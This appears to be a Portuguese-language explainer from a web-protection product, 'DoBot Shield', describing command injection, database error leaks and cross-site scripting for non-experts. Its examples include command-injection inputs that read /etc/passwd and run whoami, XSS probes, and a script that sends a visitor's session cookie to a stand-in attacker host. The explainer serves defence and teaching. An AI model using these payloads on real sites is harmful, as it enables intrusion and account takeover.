CMD_INJ Injeção de Comando (Command Injection) 1 evento(s) O atacante aproveita uma função do site que executa tarefas no servidor e gruda comandos próprios nela.
Em poucas palavras

Algumas páginas executam tarefas no próprio servidor, como um teste de conexão. Quando isso não é bem protegido, o atacante consegue grudar comandos extras do sistema naquela tarefa. Com eles, tenta ler arquivos restritos ou até mesmo em casos severos assumir o controle da máquina.

Como esse ataque costuma aparecer

Emendar um comando a mais

Logo depois da tarefa esperada, o atacante usa um ponto e vírgula para começar um comando dele, por exemplo listar os arquivos de contas do sistema.

Exemplo 127.0.0.1; cat /etc/passwd

O que isso quer dizer: Ele pede o teste de conexão e, em seguida, acrescenta 'e agora me mostre a lista de usuários do servidor'.

Confirmar que a brecha funciona

Com o sinal &&, o atacante faz o segundo comando rodar só se o primeiro tiver dado certo. É um jeito de ter certeza de que o ataque está funcionando.

Exemplo 127.0.0.1 && whoami

O que isso quer dizer: Faz o teste e, se ele passar, pede também 'me diga qual usuário o servidor está usando agora'.

Como o DoBot Shield protege

O DoBot Shield percebe os sinais usados para emendar um comando no outro, junto com as ferramentas que costumam ser chamadas nesses ataques, e recusa a requisição.

RESPONSE_SQL_ERROR Vazamento de Erro de Banco de Dados (na resposta) 1 evento(s) Ao dar erro, o site devolve uma mensagem técnica do banco que acaba entregando informações internas.
Em poucas palavras

Aqui o problema está na resposta do site, e não no pedido. Quando algo dá errado, o sistema pode acabar mostrando a mensagem de erro crua do banco de dados. Essa mensagem revela detalhes internos, como nomes de tabelas, que ajudam o atacante a planejar o passo seguinte.

Como esse ataque costuma aparecer

Mensagem de erro do banco aparecendo na tela

No lugar de um aviso genérico, o site mostra o recado técnico do banco, com códigos e termos que confirmam a brecha e expõem como o sistema é organizado por dentro.

Exemplo SQLSTATE[42000]: Syntax error near 'DROP TABLE'

O que isso quer dizer: Em vez de um simples 'algo deu errado', o site exibe o relatório interno do banco, que vira um mapa nas mãos do atacante.

Como o DoBot Shield protege

O DoBot Shield examina o que o site responde e, ao encontrar uma mensagem de erro de banco vazando, troca a resposta para não entregar nenhuma pista.

XSS Cross-Site Scripting (XSS) 1 evento(s) O atacante esconde uma parte de um programa num campo do site para que ele rode no navegador de quem abrir a página.
Em poucas palavras

Esse ataque mira os outros visitantes do site, e não o servidor. O atacante digita um pequeno parte de programa em algum campo, como a caixa de busca, um comentário ou o nome do perfil. Se o site mostrar esse texto na tela sem tratar, o navegador de quem abrir a página entende aquilo como código e executa. A partir daí, dá para roubar a senha, copiar o acesso já logado da pessoa ou fazer ações no lugar dela.

Como esse ataque costuma aparecer

Aviso na tela só para testar

É a forma mais simples. O atacante manda a página abrir uma pequena janela de aviso. Sozinho, isso não causa dano nenhum. Serve só para ele confirmar que o código dele realmente roda ali.

Exemplo <script>alert(1)</script>

O que isso quer dizer: Funciona como deixar um bilhete dizendo 'consegui entrar aqui'. Não rouba nada, mas mostra que a porta estava destrancada.

Roubo do acesso já logado (cookie)

Quando você entra em uma conta, o site guarda no seu navegador um arquivo que comprova que é você. Esse código copia esse arquivo e manda para o atacante, que passa a entrar na sua conta sem precisar da senha.

Exemplo <script>new Image().src='http://malicioso/?c='+document.cookie</script>

O que isso quer dizer: Ele tira uma cópia escondida do seu comprovante de login e envia para o computador dele.

Escondido em uma imagem que falha

Em vez de usar a palavra script, que é fácil de filtrar, o atacante coloca uma imagem que sempre dá erro ao carregar. Esse erro foi preparado para disparar o código no lugar.

Exemplo <img src=x onerror=alert(1)>

O que isso quer dizer: A imagem foi feita para quebrar de propósito. No instante em que ela falha, o código escondido entra em ação.

Como o DoBot Shield protege

O DoBot Shield já conhece a forma desses pedaços de código e os reconhece mesmo quando vêm embaralhados ou disfarçados. Quando encontra um, recusa a requisição antes que ela chegue ao site.
